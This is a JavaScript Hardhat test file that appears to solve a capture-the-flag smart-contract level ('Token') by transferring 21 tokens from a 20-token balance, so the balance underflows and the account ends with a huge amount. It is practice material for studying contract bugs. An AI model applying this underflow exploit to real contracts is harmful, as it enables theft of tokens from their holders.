
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level5 = await hre.ethers.getContractFactory("Token");
        const level5 = await Level5.deploy(20);
        await level5.deployed();
        console.log(
          `Level5 deployed at address ${level5.address}`
        )
        return {level5, owner, otherAccount};
    }

    /*
    You are given 20 tokens to start with and you will beat the level if you somehow manage 
    to get your hands on any additional tokens. Preferably a very large amount of tokens.
    */
    describe("Solve", function() {
        it("Should solve level5", async function() {
            const {level5, owner, otherAccount} = await loadFixture(deployFallback);
            // give ourselves 20 tokens to start
            // transfer > 20 tokens to another address to underflow our balance
            //await level5.connect(otherAccount).constructor(20);
            await level5.connect(owner).transfer(otherAccount.address, 21);
            const balance = await level5.connect(owner).balanceOf(owner.address);
            console.log(balance);
            expect(balance).gt(20);
        })
    });
});